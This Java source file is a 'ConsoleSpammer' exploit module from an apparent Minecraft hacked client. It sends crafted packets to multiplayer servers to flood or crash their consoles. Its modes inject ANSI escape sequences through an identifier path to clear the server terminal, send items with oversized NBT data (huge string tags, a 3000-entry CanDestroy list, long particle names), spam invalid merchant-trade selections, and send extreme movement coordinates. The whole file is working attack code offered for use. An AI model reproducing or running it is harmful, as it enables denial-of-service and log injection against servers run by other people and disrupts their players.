package net.shadow.feature.module;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.text.LiteralText;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.mixin.IdentifierAccessor;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;

public class ConsoleSpammerModule extends Module {
    static World w;
    final SliderValue delay = this.config.create("Power", 1, 1, 20, 1);
    final MultiValue mode = this.config.create("Mode", "Merchant", "Merchant", "Motion", "ClearConsole", "Book", "Particles", "CrashConsole");

    public ConsoleSpammerModule() {
        super("ConsoleSpammer", "spam the console with errors", ModuleType.EXPLOIT);
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
        if (mode.getThis().equalsIgnoreCase("clearconsole")) {
            Identifier sysinfo = new Identifier("minecraft:code");
            ((IdentifierAccessor) sysinfo).setPath("\033\143\033\133\061\073\063\061\155");
            AdvancementTabC2SPacket packet = new AdvancementTabC2SPacket(AdvancementTabC2SPacket.Action.OPENED_TAB, sysinfo);
            Shadow.c.getNetworkHandler().sendPacket(packet);
            this.setEnabled(false);
        } else if (mode.getThis().equalsIgnoreCase("book")) {
            ItemStack consolespammer = new ItemStack(Items.KNOWLEDGE_BOOK, 1);
            NbtCompound compound = new NbtCompound();
            for (int i = 0; i < 25; i++) {
                compound.put("tag", NbtString.of("__________".repeat(50)));
            }
            consolespammer.setNbt(compound);
            consolespammer.setCustomName(new LiteralText("Console Spammer"));
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, consolespammer));
            NotificationSystem.notifications.add(new Notification("Console Spammer", "Gave you a console spammer", 150));
        } else if (mode.getThis().equalsIgnoreCase("particles")) {
            ItemStack forcrash = new ItemStack(Items.PUFFERFISH_SPAWN_EGG, 1);
            try {
                forcrash.setNbt(StringNbtReader.parse("{EntityTag:{Duration:0,Particle:\"_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________\",id:\"minecraft:area_effect_cloud\"}}"));
            } catch (CommandSyntaxException ignored) {
            }
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, forcrash));
            for (int i = 0; i < 266; i++) {
                Shadow.c.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, Shadow.c.player.getBlockPos(), true)));
            }
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, new ItemStack(Items.AIR, 1)));
        }
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        if (mode.getThis().equalsIgnoreCase("merchant")) {
            for (int i = 0; i < delay.getThis(); i++) {
                Shadow.c.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(-1));
            }
        } else if (mode.getThis().equalsIgnoreCase("motion")) {
            Shadow.c.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Shadow.c.player.getX(), 9999999, Shadow.c.player.getZ(), false));
        } else if (mode.getThis().equalsIgnoreCase("crashconsole")) {
            ItemStack crasher = new ItemStack(Items.PISTON, 1);
            NbtCompound main = new NbtCompound();
            NbtList tags = new NbtList();
            for (int i = 0; i < 3000; i++) {
                tags.add(NbtString.of("minecraft:" + i));
            }
            main.put("CanDestroy", tags);
            crasher.setNbt(main);
            for (int i = 0; i < 4; i++) {
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, crasher));
            }
        }
    }

    @Override
    public void onRender() {
    }
}
